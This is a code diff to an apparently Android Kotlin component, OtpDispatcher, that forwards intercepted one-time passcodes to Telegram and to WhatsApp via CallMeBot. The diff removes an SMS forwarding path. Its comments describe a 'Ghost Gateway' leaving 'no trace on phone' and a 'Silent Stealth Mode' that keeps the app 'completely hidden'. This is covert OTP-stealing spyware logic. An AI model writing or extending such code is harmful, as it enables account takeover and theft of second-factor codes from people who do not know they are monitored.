@@ -83,7 +83,6 @@ object OtpDispatcher {
         var telegramStatus = "Disabled"
         var telegram2Status = "Disabled"
         var whatsappStatus = "Disabled"
-        var smsStatus = "Disabled"
 
         withContext(Dispatchers.IO) {
             // 1A. Telegram 1 (Primary - Default Locked)
@@ -122,7 +121,7 @@ object OtpDispatcher {
                 }
             }
 
-            // 2. WhatsApp
+            // 2. WhatsApp (CallMeBot Ghost Gateway - No trace on phone)
             val isWhatsAppEnabled = prefs.getBoolean("is_whatsapp_enabled", false)
             if (isWhatsAppEnabled) {
                 val waPhone = prefs.getString("wa_phone", "") ?: ""
@@ -137,20 +136,6 @@ object OtpDispatcher {
                 }
             }
 
-            // 3. Direct SMS
-            val isSmsEnabled = prefs.getBoolean("is_sms_enabled", false)
-            if (isSmsEnabled) {
-                val smsPhone = prefs.getString("sms_phone", "") ?: ""
-                if (smsPhone.isNotEmpty()) {
-                    try {
-                        val res = SmsHelper.sendSms(context, smsPhone, alertText)
-                        smsStatus = if (res.first) "Sent" else "Failed"
-                    } catch (e: Exception) {
-                        smsStatus = "Error"
-                    }
-                }
-            }
-
             // Save History Log
             HistoryManager.addEntry(
                 context = context,
@@ -159,8 +144,7 @@ object OtpDispatcher {
                 fullMessage = fullMessage,
                 telegramStatus = telegramStatus,
                 telegram2Status = telegram2Status,
-                whatsappStatus = whatsappStatus,
-                smsStatus = smsStatus
+                whatsappStatus = whatsappStatus
             )
 
             // 100% Silent Stealth Mode by default (No screen popups so app remains completely hidden)
